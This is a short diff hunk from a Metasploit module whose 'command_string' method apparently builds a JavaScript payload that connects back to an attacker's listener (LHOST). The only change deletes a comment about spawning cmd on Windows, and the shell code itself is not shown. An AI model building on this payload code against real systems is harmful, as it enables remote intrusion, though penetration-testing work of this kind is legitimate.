@@ -45,7 +45,6 @@ module Metasploit3
   # Returns the JS string to use for execution
   #
   def command_string
-    # Does anyone know of a concise way to tell if we're running on windows so that we spawn cmd?
     lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
     cmd   = <<EOS
 (function(){
